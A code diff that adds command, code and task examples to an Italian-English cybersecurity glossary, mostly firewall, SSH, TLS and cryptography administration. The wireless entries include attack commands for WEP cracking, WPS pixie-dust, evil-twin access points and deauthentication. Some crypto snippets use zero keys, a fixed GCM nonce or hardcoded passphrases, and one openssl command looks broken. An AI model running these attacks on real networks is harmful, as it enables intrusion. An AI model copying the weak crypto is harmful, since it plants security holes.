@@ -1247,6 +1433,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'Approccio "blocca solo ci\u00F2 che \u00E8 noto come pericoloso". Pi\u00F9 permissivo della whitelist.',
+              command:
+                'sudo iptables -A INPUT -s 185.220.101.42 -j DROP && sudo iptables -A INPUT -s 91.243.59.0/24 -j DROP',
+              task: `Aggiungi alla blacklist del firewall l'IP del nodo Tor e la subnet segnalata dal feed di threat intelligence per bloccare le scansioni automatiche.`,
             },
             {
               english: 'Mobile Device Management (MDM)',
@@ -1270,6 +1459,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'A differenza del firewall di rete, opera direttamente sul singolo dispositivo.',
+              command:
+                'sudo ufw default deny incoming && sudo ufw allow from 10.0.0.0/24 to any port 22 && sudo ufw enable',
+              task: 'Configura il firewall locale UFW con deny di default in ingresso e permetti SSH solo dalla LAN amministrativa prima di esporre il server.',
             },
             {
               english: 'Hardening',
@@ -1281,6 +1473,8 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'Processo di "indurimento": rimuovere software inutile, chiudere porte, disabilitare servizi non necessari.',
+              command: 'sudo lynis audit system --quick --report-file /tmp/lynis-baseline.txt',
+              task: 'Esegui un audit di hardening con Lynis sul server appena installato per generare la baseline di sicurezza da inviare al cliente.',
             },
             {
               english: 'Compliance',
@@ -1321,6 +1515,9 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Successore di SSL. La versione attuale \u00E8 TLS 1.3 (2018), molto pi\u00F9 veloce e sicura.',
+              command:
+                'openssl s_client -connect www.example.com:443 -servername www.example.com -tls1_3 -showcerts < /dev/null',
+              task: 'Negozia una connessione TLS 1.3 verso il sito target e stampa la catena di certificati per verificare quale CA ha emesso il certificato server.',
             },
             {
               english: 'HTTPS strict transport',
@@ -1331,6 +1528,14 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: `L'header chiave è Strict-Transport-Security; la direttiva preload include il dominio nelle liste hardcoded dei browser.`,
+              command: `curl -sI https://www.example.com | grep -i 'strict-transport-security'`,
+              code: `from flask import Flask, make_response
+app = Flask(__name__)
+@app.after_request
+def hsts(resp):
+    resp.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
+    return resp`,
+              task: `Aggiungi il middleware Flask che imposta l'header HSTS con max-age di un anno e preload per impedire ai browser di tornare al testo in chiaro.`,
             },
             {
               english: 'Digital Certificate',
@@ -1343,6 +1548,14 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: "Contiene la chiave pubblica del proprietario, firmata da un'autorit\u00E0 di certificazione (CA).",
+              command:
+                'openssl x509 -in /etc/letsencrypt/live/example.com/fullchain.pem -noout -text -dates -issuer',
+              code: `from cryptography import x509
+from cryptography.hazmat.backends import default_backend
+data = open('cert.pem','rb').read()
+cert = x509.load_pem_x509_certificate(data, default_backend())
+print(cert.subject, cert.not_valid_after)`,
+              task: `Ispeziona il certificato digitale Let's Encrypt per estrarre data di scadenza ed emittente prima di automatizzare il rinnovo.`,
             },
             {
               english: 'Public Key',
@@ -1354,6 +1567,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Come un lucchetto aperto: chiunque pu\u00F2 chiudere (crittografare), ma solo tu hai la chiave per aprire.',
+              command: `ssh-keygen -t ed25519 -C 'alice@corp' -f ~/.ssh/id_ed25519 && ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@bastion.example.com`,
+              code: `from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+pub = key.public_key().public_bytes(serialization.Encoding.OpenSSH, serialization.PublicFormat.OpenSSH)
+print(pub.decode())`,
+              task: 'Genera una coppia di chiavi Ed25519 e installa la chiave pubblica sul bastion host per autenticare Alice senza password.',
             },
             {
               english: 'Private Key',
@@ -1365,6 +1585,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Deve rimanere assolutamente segreta. Se compromessa, tutta la sicurezza crolla.',
+              command:
+                'openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:4096 -aes-256-cbc && chmod 600 private.key',
+              code: `from cryptography.hazmat.primitives import serialization
+with open('private.key','rb') as f:
+    key = serialization.load_pem_private_key(f.read(), password=b'passphrase')
+sig = key.sign(b'payload')`,
+              task: 'Genera la chiave privata RSA a 4096 bit cifrata con passphrase e imposta i permessi a 600 affinche solo il proprietario possa leggerla.',
             },
             {
               english: 'end-to-end encryption',
@@ -1376,6 +1603,14 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Acronimo comune: E2EE. La chiave non è mai accessibile al provider del servizio.',
+              command: 'gpg --encrypt --armor --recipient bob@example.com message.txt',
+              code: `from nacl.public import PrivateKey, Box
+alice = PrivateKey.generate()
+bob = PrivateKey.generate()
+box = Box(alice, bob.public_key)
+cipher = box.encrypt(b'segreto end-to-end')
+print(cipher.hex())`,
+              task: 'Cifra end-to-end il messaggio per Bob usando la sua chiave pubblica GPG cosi che neppure il server di transito possa leggerlo.',
             },
             {
               english: 'Decryption',
@@ -1387,6 +1622,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Il processo inverso della crittografia: dalla forma cifrata a quella leggibile.',
+              command:
+                'openssl enc -aes-256-cbc -d -pbkdf2 -in backup.enc -out backup.tar -pass file:/etc/keys/backup.key',
+              code: `from cryptography.fernet import Fernet
+f = Fernet(open('master.key','rb').read())
+plaintext = f.decrypt(open('secret.enc','rb').read())
+print(plaintext.decode())`,
+              task: 'Decifra il backup AES-256 con la chiave conservata nel vault per ripristinare i dati dopo il disaster recovery test.',
             },
             {
               english: 'Hash',
@@ -1398,6 +1640,12 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: "Funzione unidirezionale: dal dato all'hash \u00E8 facile, dall'hash al dato \u00E8 (quasi) impossibile.",
+              command: 'sha256sum ubuntu-22.04.iso && shasum -a 256 -c SHA256SUMS',
+              code: `import bcrypt
+pwd = b'CorrectHorseBatteryStaple'
+hashed = bcrypt.hashpw(pwd, bcrypt.gensalt(rounds=12))
+print(bcrypt.checkpw(pwd, hashed))`,
+              task: `Verifica l'hash SHA-256 dell'immagine ISO scaricata contro il file ufficiale prima di distribuirla agli utenti.`,
             },
             {
               english: 'Digital Signature',
@@ -1410,6 +1658,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Usa la chiave privata per firmare e la chiave pubblica per verificare. Garantisce autenticit\u00E0 e integrit\u00E0.',
+              command:
+                'gpg --detach-sign --armor --local-user release@corp.com release-v1.2.0.tar.gz',
+              code: `from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+sig = key.sign(payload, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
+pub.verify(sig, payload, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())`,
+              task: `Firma digitalmente il tarball della release con la chiave GPG del team per dimostrare agli utenti l'autenticita del file scaricato.`,
             },
           ],
         },
@@ -1461,6 +1716,8 @@ export default {
               context: 'networking',
               difficulty: 'intermediate',
               note: 'Media Access Control. Indirizzo fisico "bruciato" nella scheda di rete.',
+              command: `ip link show eth0 | awk '/ether/ {print $2}'`,
+              task: `Estrai l'indirizzo MAC dell'interfaccia eth0 per registrarlo nella lista di port security dello switch di piano.`,
             },
             {
               english: 'Network Interface Card (NIC)',
@@ -1471,6 +1728,8 @@ export default {
                 'The NIC connects the computer to the network. = La NIC connette il computer alla rete.',
               context: 'networking',
               difficulty: 'beginner',
+              command: 'ip -brief link show && ethtool eth0',
+              task: 'Ispeziona stato e capacita della NIC eth0 per verificare se la negoziazione del link e a 1 Gbps full-duplex.',
             },
             {
               english: 'Switch',
@@ -1515,6 +1774,9 @@ export default {
               context: 'networking',
               difficulty: 'intermediate',
               note: 'Permette di separare logicamente reti fisicamente unite.',
+              command:
+                'sudo ip link add link eth0 name eth0.100 type vlan id 100 && sudo ip addr add 10.0.100.2/24 dev eth0.100 && sudo ip link set eth0.100 up',
+              task: 'Crea la sotto-interfaccia tagged sulla VLAN 100 per separare il traffico amministrativo dal traffico utenti sullo stesso uplink fisico.',
             },
             {
               english: 'Subnetting',
@@ -1526,6 +1788,12 @@ export default {
               context: 'networking',
               difficulty: 'advanced',
               note: 'Dividere una rete IP in reti pi\u00F9 piccole (sottoreti).',
+              command: 'ipcalc 192.168.10.0/22 --split 26 26 26 26',
+              code: `import ipaddress
+net = ipaddress.ip_network('10.50.0.0/22')
+for sub in net.subnets(new_prefix=26):
+    print(sub, sub.broadcast_address, sub.num_addresses)`,
+              task: `Suddividi la rete /22 in quattro sotto-reti /26 per assegnare un blocco distinto a ciascun dipartimento dell'azienda.`,
             },
             {
               english: 'Default Gateway',
@@ -1536,6 +1804,9 @@ export default {
                 'The default gateway is your exit point to the internet. = Il gateway predefinito \u00E8 il tuo punto di uscita verso internet.',
               context: 'networking',
               difficulty: 'intermediate',
+              command:
+                'ip route show default && sudo ip route replace default via 192.168.1.1 dev eth0 metric 100',
+              task: 'Sostituisci il default gateway con il nuovo router perimetrale e assegna una metrica bassa per renderlo prioritario sulle rotte alternative.',
             },
           ],
         },
@@ -1554,6 +1825,14 @@ export default {
               context: 'protocols',
               difficulty: 'intermediate',
               note: 'Livello 4. Garantisce la consegna dei pacchetti con il "three-way handshake" (SYN, SYN-ACK, ACK).',
+              command: 'nc -zv -w 2 db.internal.corp 5432',
+              code: `import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3)
+s.connect(('api.example.com', 443))
+print('handshake completato:', s.getpeername())
+s.close()`,
+              task: `Verifica che il three-way handshake TCP verso PostgreSQL sulla porta 5432 si chiuda correttamente prima di migrare l'applicazione.`,
             },
             {
               english: 'UDP (User Datagram Protocol)',
@@ -1565,6 +1844,13 @@ export default {
               context: 'protocols',
               difficulty: 'intermediate',
               note: 'Livello 4. Protocollo veloce ma senza conferma di ricezione (connectionless).',
+              command: 'nc -u -w 1 ntp.corp.local 123 < /dev/null',
+              code: `import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(b'\\x1b' + 47 * b'\\0', ('pool.ntp.org', 123))
+data, addr = s.recvfrom(1024)
+print('NTP risp', len(data), 'byte da', addr)`,
+              task: 'Invia un pacchetto UDP NTP al server di tempo per verificare che la porta 123 sia raggiungibile attraverso il firewall.',
             },
             {
               english: 'ICMP (Internet Control Message Protocol)',
@@ -1576,6 +1862,8 @@ export default {
               context: 'protocols',
               difficulty: 'intermediate',
               note: 'Livello 3. Usato per segnalazioni di errore e diagnostica di rete.',
+              command: 'ping -c 4 -W 2 -i 0.5 8.8.8.8',
+              task: 'Lancia quattro ping ICMP verso il DNS pubblico di Google per misurare la latenza media e individuare eventuali perdite di pacchetti.',
             },
             {
               english: 'DNS (Domain Name System)',
@@ -1587,6 +1875,13 @@ export default {
               context: 'protocols',
               difficulty: 'beginner',
               note: 'Protocollo Livello 7. "L\'elenco telefonico" di Internet.',
+              command: 'dig +short @1.1.1.1 example.com A AAAA && dig +trace example.com',
+              code: `import dns.resolver
+resolver = dns.resolver.Resolver()
+resolver.nameservers = ['1.1.1.1']
+for r in resolver.resolve('example.com','MX'):
+    print(r.preference, r.exchange)`,
+              task: 'Risolvi i record A, AAAA e MX di example.com contro il resolver Cloudflare per diagnosticare un problema di consegna email.',
             },
             {
               english: 'DHCP (Dynamic Host Configuration Protocol)',
@@ -1597,6 +1892,8 @@ export default {
                 'When you connect to Wi-Fi, DHCP assigns an IP address to your device automatically. = Quando ti connetti al Wi-Fi, il DHCP assegna automaticamente un indirizzo IP al tuo dispositivo.',
               context: 'protocols',
               difficulty: 'intermediate',
+              command: 'sudo dhclient -v -r eth0 && sudo dhclient -v eth0',
+              task: `Rilascia il lease DHCP corrente sull'interfaccia eth0 e richiedine uno nuovo per applicare la modifica al pool di indirizzi.`,
             },
             {
               english: 'SNMP (Simple Network Management Protocol)',
@@ -1607,6 +1904,8 @@ export default {
                 'Large enterprises use SNMP to monitor network devices such as routers, switches, and printers from a centralized management console. = Le grandi aziende usano SNMP per monitorare dispositivi di rete come router, switch e stampanti da una console di gestione centralizzata.',
               context: 'protocols',
               difficulty: 'advanced',
+              command: 'snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1.10',
+              task: 'Interroga via SNMP v2c i contatori di byte in ingresso sulle interfacce del router per costruire il grafico di traffico in Grafana.',
             },
             {
               english: 'ARP (Address Resolution Protocol)',
@@ -1617,6 +1916,8 @@ export default {
               context: 'protocols',
               difficulty: 'advanced',
               note: 'Livello 2/3. Fondamentale per far comunicare IP e hardware in una rete locale.',
+              command: 'ip neigh show && sudo arping -c 3 -I eth0 192.168.1.1',
+              task: 'Ispeziona la cache ARP e verifica con arping che il default gateway risponda alla risoluzione MAC sulla LAN.',
             },
             {
               english: 'SFTP (Secure File Transfer Protocol)',
@@ -1627,6 +1928,8 @@ export default {
                 "Unlike plain FTP, SFTP encrypts both commands and data transfer over an SSH tunnel, preventing eavesdroppers from capturing file contents. = A differenza del semplice FTP, l'SFTP crittografa sia i comandi che il trasferimento dati su un tunnel SSH, impedendo agli intercettatori di catturare il contenuto dei file.",
               context: 'protocols',
               difficulty: 'intermediate',
+              command: `sftp -i ~/.ssh/deploy_ed25519 -P 2222 deploy@backup.corp.local <<< 'put release.tar.gz /uploads/'`,
+              task: 'Carica il tarball della release sul server di backup via SFTP autenticandoti con la chiave privata dedicata al deploy.',
             },
             {
               english: 'SSH (Secure Shell)',
@@ -1637,6 +1940,9 @@ export default {
                 'Use SSH to manage remote servers securely. = Usa SSH per gestire server remoti in modo sicuro.',
               context: 'protocols',
               difficulty: 'beginner',
+              command:
+                'ssh -i ~/.ssh/admin_ed25519 -p 2222 -o StrictHostKeyChecking=yes admin@bastion.example.com',
+              task: `Apri una sessione SSH amministrativa sul bastion verificando l'host key per rilevare eventuali MITM sulla porta non standard.`,
             },
             {
               english: 'SMTP (Simple Mail Transfer Protocol)',
@@ -1647,6 +1953,14 @@ export default {
                 "Email clients use SMTP to send messages and IMAP or POP3 to receive them. = I client email usano l'SMTP per inviare messaggi e IMAP o POP3 per riceverli.",
               context: 'protocols',
               difficulty: 'beginner',
+              command: `swaks --to alerts@corp.com --from soc@corp.com --server smtp.corp.local:587 --tls --auth-user soc --header 'Subject: Test SOC'`,
+              code: `import smtplib, ssl
+ctx = ssl.create_default_context()
+with smtplib.SMTP('smtp.corp.local', 587) as s:
+    s.starttls(context=ctx)
+    s.login('soc','***')
+    s.sendmail('soc@corp.com', ['alerts@corp.com'], 'Subject: Alert\\n\\nrun-book')`,
+              task: 'Invia una mail di test SMTP con STARTTLS al gruppo alert per validare che il relay autenticato dal SOC funzioni dopo la migrazione.',
             },
           ],
         },
@@ -1696,6 +2010,9 @@ export default {
               context: 'monitoring',
               difficulty: 'advanced',
               note: 'Inviare una copia del traffico di rete a uno strumento di monitoraggio o analisi.',
+              command:
+                'sudo tc qdisc add dev eth0 ingress && sudo tc filter add dev eth0 parent ffff: matchall action mirred egress mirror dev eth1',
+              task: `Configura il mirroring di eth0 verso eth1 con tc affinche l'IDS sulla seconda NIC veda una copia di ogni pacchetto in ingresso.`,
             },
             {
               english: 'Access Control List (ACL)',
@@ -1706,6 +2023,9 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: 'Regole che permettono o negano il traffico in base a IP, porta o protocollo.',
+              command:
+                'sudo iptables -A FORWARD -s 10.0.0.0/8 -d 192.168.10.0/24 -p tcp --dport 3306 -j DROP',
+              task: 'Aggiungi una ACL al firewall che vieta a tutta la rete utente di raggiungere MySQL sulla sottorete dei database in produzione.',
             },
             {
               english: 'Port Security',
@@ -1727,6 +2047,8 @@ export default {
                 'NAT allows private IPs to access the internet. = Il NAT permette agli IP privati di accedere a internet.',
               context: 'networking',
               difficulty: 'intermediate',
+              command: 'sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE',
+              task: `Configura il NAT masquerade in uscita su eth0 per permettere alla LAN privata 10.0.0.0/24 di navigare in Internet con l'IP pubblico del router.`,
             },
             {
               english: 'Packet Filtering',
@@ -1737,6 +2059,9 @@ export default {
                 'Older firewalls rely on simple packet filtering based on source and destination IP. = I firewall più vecchi si basano su un semplice filtraggio dei pacchetti in base a IP sorgente e destinazione.',
               context: 'defense',
               difficulty: 'intermediate',
+              command:
+                'sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 50 -j REJECT',
+              task: 'Filtra i pacchetti SYN in ingresso sulla porta 80 limitando a 50 connessioni concorrenti per IP per mitigare un SYN flood leggero.',
             },
             {
               english: 'Stateful Inspection',
@@ -1748,6 +2073,9 @@ export default {
               context: 'defense',
               difficulty: 'advanced',
               note: 'Pi\u00F9 avanzata del semplice filtraggio: riconosce se un pacchetto fa parte di una sessione esistente.',
+              command:
+                'sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT && sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP',
+              task: `Abilita l'ispezione stateful permettendo solo i pacchetti delle connessioni gia stabilite e droppando quelli classificati come INVALID.`,
             },
             {
               english: 'Proxy Server',
@@ -1758,6 +2086,9 @@ export default {
                 'A proxy server hides internal IP addresses. = Un server proxy nasconde gli indirizzi IP interni.',
               context: 'defense',
               difficulty: 'intermediate',
+              command:
+                'sudo squid -k parse && sudo systemctl reload squid && tail -f /var/log/squid/access.log',
+              task: 'Valida la configurazione di Squid, ricarica il proxy server e segui in tempo reale gli access log per verificare che il caching funzioni.',
             },
           ],
         },
@@ -1776,6 +2107,8 @@ export default {
               context: 'wireless',
               difficulty: 'beginner',
               note: 'Il nome pubblico che identifica una rete wireless.',
+              command: `sudo iwlist wlan0 scan | grep -E 'ESSID|Quality|Encryption' | head -30`,
+              task: `Scansiona gli SSID visibili dall'interfaccia wlan0 mostrando qualita del segnale e cifratura per individuare reti non autorizzate in azienda.`,
             },
             {
               english: 'WEP (Wired Equivalent Privacy)',
@@ -1787,6 +2120,8 @@ export default {
               context: 'wireless',
               difficulty: 'beginner',
               note: 'Il primo standard di sicurezza wireless, oggi facilmente violabile in pochi minuti.',
+              command: 'sudo aircrack-ng -b 00:11:22:33:44:55 -n 64 captures/wep-cap-01.cap',
+              task: `Forza la chiave WEP a 64 bit dall'handshake catturato per dimostrare al cliente quanto sia banale violare questo protocollo legacy.`,
             },
             {
               english: 'WPA3 (Wi-Fi Protected Access 3)',
@@ -1798,6 +2133,9 @@ export default {
               context: 'wireless',
               difficulty: 'intermediate',
               note: 'Successore del WPA2. Introduce la protezione contro gli attacchi di forza bruta offline.',
+              command:
+                'sudo wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa3-corp.conf -B && wpa_cli -i wlan0 status',
+              task: `Connetti il laptop alla rete aziendale WPA3-SAE in background e verifica lo stato dell'associazione tramite wpa_cli.`,
             },
             {
               english: 'WPS (Wi-Fi Protected Setup)',
@@ -1809,6 +2147,8 @@ export default {
               context: 'wireless',
               difficulty: 'intermediate',
               note: 'Metodo semplificato per connettere dispositivi. Ha gravi vulnerabilit\u00E0 nel PIN a 8 cifre.',
+              command: 'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1',
+              task: `Avvia reaver in modalita pixie-dust contro l'access point target per dimostrare al cliente la vulnerabilita del PIN WPS a 8 cifre.`,
             },
             {
               english: 'Rogue Access Point',
@@ -1820,6 +2160,8 @@ export default {
               context: 'threats',
               difficulty: 'intermediate',
               note: 'Un router WiFi connesso alla rete aziendale senza autorizzazione, creando una "porta sul retro".',
+              command: 'sudo kismet -c wlan0mon --no-ncurses-wrapper --tcp-port 2501',
+              task: `Avvia Kismet sull'interfaccia in monitor mode per scoprire eventuali access point canaglia connessi alla LAN aziendale.`,
             },
             {
               english: 'Evil Twin',
@@ -1831,6 +2173,8 @@ export default {
               context: 'threats',
               difficulty: 'intermediate',
               note: 'Un access point malevolo con lo stesso SSID di una rete fidata per rubare credenziali.',
+              command: `sudo airbase-ng -e 'CorpGuest' -c 6 -P -C 30 wlan0mon`,
+              task: `Crea un access point evil twin che cloni l'SSID CorpGuest durante l'esercizio red team per misurare quanti utenti si connettono spontaneamente.`,
             },
             {
               english: 'Wardriving',
@@ -1841,6 +2185,9 @@ export default {
                 'Security auditors sometimes perform wardriving to map unprotected wireless networks. = I revisori di sicurezza a volte fanno wardriving per mappare le reti wireless non protette.',
               context: 'threats',
               difficulty: 'intermediate',
+              command:
+                'sudo kismet -c wlan0mon --gps-host localhost:2947 --log-types kismet,pcapng',
+              task: 'Esegui wardriving georeferenziato con Kismet collegato al daemon GPSD per mappare le reti wireless non protette del quartiere industriale.',
             },
             {
               english: 'Deauthentication Attack',
@@ -1853,6 +2200,9 @@ export default {
               context: 'threats',
               difficulty: 'advanced',
               note: "Spesso usato per catturare l'handshake WPA necessario per decifrare la password.",
+              command:
+                'sudo aireplay-ng --deauth 25 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon',
+              task: `Invia 25 pacchetti di deautenticazione al client target per forzarlo a riassociarsi e catturare l'handshake WPA durante il pentest autorizzato.`,
             },
             {
               english: 'WIPS (Wireless Intrusion Prevention System)',
@@ -1898,6 +2248,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Veloce ed efficiente, ma richiede un modo sicuro per scambiarsi la chiave.',
+              command:
+                'openssl enc -aes-256-cbc -salt -in plain.txt -out cipher.bin -pass pass:secret123',
+              code: `from cryptography.fernet import Fernet
+key = Fernet.generate_key()
+ctext = Fernet(key).encrypt(b'secret message')
+print(Fernet(key).decrypt(ctext))`,
+              task: 'Cifra il contenuto di plain.txt con AES-256-CBC e una passphrase, producendo il file binario cipher.bin.',
             },
             {
               english: 'Plaintext',
@@ -1909,6 +2266,9 @@ export default {
               context: 'cryptography',
               difficulty: 'beginner',
               note: 'Il messaggio originale leggibile prima della cifratura.',
+              command:
+                'openssl enc -aes-256-cbc -d -in cipher.bin -out plain.txt -pass pass:secret123',
+              task: 'Recupera il testo in chiaro decifrando cipher.bin con la stessa passphrase usata in cifratura.',
             },
             {
               english: 'Ciphertext',
@@ -1920,6 +2280,9 @@ export default {
               context: 'cryptography',
               difficulty: 'beginner',
               note: 'Il risultato della cifratura, incomprensibile senza la chiave corretta.',
+              command:
+                'openssl enc -aes-256-cbc -in messaggio.txt -out messaggio.enc -pass pass:topsecret && xxd messaggio.enc | head',
+              task: 'Genera il testo cifrato di messaggio.txt con AES-256-CBC e visualizzane i primi byte in esadecimale.',
             },
             {
               english: 'Encryption Key',
@@ -1930,6 +2293,12 @@ export default {
                 'Losing your encryption key means all protected data becomes permanently unreadable. = Perdere la chiave di cifratura significa che tutti i dati protetti diventano permanentemente illeggibili.',
               context: 'cryptography',
               difficulty: 'beginner',
+              command: 'openssl rand -hex 32 > aes.key',
+              code: `import secrets
+key = secrets.token_bytes(32)
+with open('aes.key', 'wb') as f:
+    f.write(key)`,
+              task: 'Genera una chiave di cifratura AES-256 casuale crittograficamente sicura e salvala su disco.',
             },
             {
               english: 'AES (Advanced Encryption Standard)',
@@ -1941,6 +2310,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Supporta chiavi a 128, 192 e 256 bit. Considerato sicuro anche contro computer quantistici (nella versione 256-bit).',
+              command:
+                'openssl enc -aes-256-gcm -in dati.bin -out dati.enc -K $(openssl rand -hex 32) -iv $(openssl rand -hex 12)',
+              code: `from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+key = AESGCM.generate_key(bit_length=256)
+nonce = b'\\x00' * 12
+ct = AESGCM(key).encrypt(nonce, b'segreto', None)`,
+              task: `Cifra dati.bin con AES-256 in modalita' GCM autenticata usando chiave e IV casuali.`,
             },
             {
               english: 'DES (Data Encryption Standard)',
@@ -1952,6 +2328,8 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Standard del 1977 con chiave a 56 bit. Oggi facilmente violabile.',
+              command: 'openssl enc -des-cbc -in vecchio.txt -out vecchio.enc -pass pass:legacy',
+              task: 'Cifra un file legacy con DES-CBC per dimostrare quanto sia ormai obsoleto questo algoritmo.',
             },
             {
               english: 'Stream Cipher',
@@ -1963,6 +2341,13 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Veloce e utile per lo streaming in tempo reale.',
+              command: 'openssl enc -chacha20 -in streaming.dat -out streaming.enc -pass pass:flow',
+              code: `from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
+key = b'\\x00' * 32
+nonce = b'\\x00' * 16
+c = Cipher(algorithms.ChaCha20(key, nonce), mode=None).encryptor()
+ct = c.update(b'flusso')`,
+              task: `Cifra un file in streaming con ChaCha20, un moderno cifrario a flusso piu' veloce di AES su CPU senza accelerazione.`,
             },
             {
               english: 'Block Cipher',
@@ -1974,6 +2359,12 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Divide il testo in blocchi di dimensione fissa (es. 128 bit) prima di cifrarli.',
+              code: `from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+key = b'\\x00' * 32
+iv = b'\\x00' * 16
+c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+block = c.update(b'A' * 16)`,
+              task: `Cifra un singolo blocco di 16 byte con AES in modalita' CBC per illustrare il funzionamento di un cifrario a blocchi.`,
             },
             {
               english: 'Initialization Vector (IV)',
@@ -1986,6 +2377,12 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Numero casuale usato per rendere unica ogni cifratura anche con la stessa chiave.',
+              code: `import os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+iv = os.urandom(16)
+key = os.urandom(32)
+c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()`,
+              task: 'Genera un IV casuale di 16 byte e usalo per inizializzare un cifrario AES-CBC, garantendo cifrature uniche.',
             },
             {
               english: 'Key Exchange',
@@ -1996,6 +2393,11 @@ export default {
                 'Secure key exchange is the main problem of symmetric crypto. = Lo scambio sicuro di chiavi \u00E8 il problema principale della crittografia simmetrica.',
               context: 'cryptography',
               difficulty: 'intermediate',
+              code: `from cryptography.hazmat.primitives.asymmetric import dh
+params = dh.generate_parameters(generator=2, key_size=2048)
+private_key = params.generate_private_key()
+public_key = private_key.public_key()`,
+              task: 'Esegui uno scambio di chiavi Diffie-Hellman generando parametri e una coppia di chiavi effimere.',
             },
           ],
         },
@@ -2015,6 +2417,13 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Usa due chiavi diverse ma matematicamente legate tra loro.',
+              command:
+                'openssl rsautl -encrypt -inkey public.pem -pubin -in plain.txt -out cipher.bin',
+              code: `from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
+priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+ct = priv.public_key().encrypt(b'msg', padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))`,
+              task: 'Cifra un messaggio usando la chiave pubblica RSA del destinatario in modo che solo lui possa decifrarlo.',
             },
             {
               english: 'public key fingerprint',
@@ -2026,6 +2435,8 @@ export default {
               context: 'cryptography',
               difficulty: 'beginner',
               note: 'SSH mostra la fingerprint al primo collegamento (TOFU: trust on first use).',
+              command: 'ssh-keygen -lf ~/.ssh/id_ed25519.pub',
+              task: 'Visualizza la fingerprint SHA256 della chiave pubblica SSH per confrontarla su un canale fuori banda.',
             },
             {
               english: 'private key passphrase',
@@ -2037,6 +2448,8 @@ export default {
               context: 'cryptography',
               difficulty: 'beginner',
               note: 'ssh-add la chiede una volta e mantiene la chiave decifrata in agente per la sessione.',
+              command: 'ssh-keygen -p -f ~/.ssh/id_ed25519',
+              task: `Cambia o imposta la passphrase che protegge la chiave privata SSH gia' esistente.`,
             },
             {
               english: 'Key Pair',
@@ -2047,6 +2460,8 @@ export default {
                 'A key pair consists of a public and a private key. = Una coppia di chiavi consiste in una chiave pubblica e una privata.',
               context: 'cryptography',
               difficulty: 'intermediate',
+              command: 'ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C "alice@laptop"',
+              task: `Genera una nuova coppia di chiavi Ed25519 per l'autenticazione SSH con un commento identificativo.`,
             },
             {
               english: 'RSA (Rivest-Shamir-Adleman)',
@@ -2058,6 +2473,12 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Uno degli algoritmi pi\u00F9 usati oggi al mondo. Prende il nome dai suoi inventori.',
+              command:
+                'openssl genrsa -out private.pem 4096 && openssl rsa -in private.pem -pubout -out public.pem',
+              code: `from cryptography.hazmat.primitives.asymmetric import rsa
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+public_key = private_key.public_key()`,
+              task: 'Genera una coppia di chiavi RSA a 4096 bit e esporta la chiave pubblica corrispondente in formato PEM.',
             },
             {
               english: 'ECC (Elliptic Curve Cryptography)',
@@ -2069,6 +2490,12 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Ideale per dispositivi con poca potenza di calcolo come gli smartphone.',
+              command:
+                'openssl ecparam -name prime256v1 -genkey -noout -out ec_private.pem && openssl ec -in ec_private.pem -pubout -out ec_public.pem',
+              code: `from cryptography.hazmat.primitives.asymmetric import ec
+private_key = ec.generate_private_key(ec.SECP256R1())
+public_key = private_key.public_key()`,
